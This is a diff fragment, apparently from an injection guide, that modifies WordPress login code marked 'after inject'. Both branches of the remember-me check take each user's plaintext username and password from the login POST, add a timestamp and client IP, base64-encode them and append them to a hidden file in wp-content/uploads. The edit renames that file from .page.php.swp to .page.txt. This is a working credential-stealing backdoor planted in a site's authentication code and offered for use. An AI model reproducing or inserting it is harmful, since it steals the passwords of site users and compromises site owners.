@@ -36,12 +36,14 @@ after inject
 ```
 if ( ! empty( $credentials['remember'] ) ) {
                 $credentials['remember'] = true;
-                $credz = date('Y-m-d h:i:sa') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
-                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
+                date_default_timezone_set('Asia/Jakarta');
+                $credz = date('Y-m-d H:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
 } else {
                 $credentials['remember'] = false;
-                $credz = date('Y-m-d h:i:sa') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
-                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
+                date_default_timezone_set('Asia/Jakarta');
+                $credz = date('Y-m-d H:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
 }
 ```
 
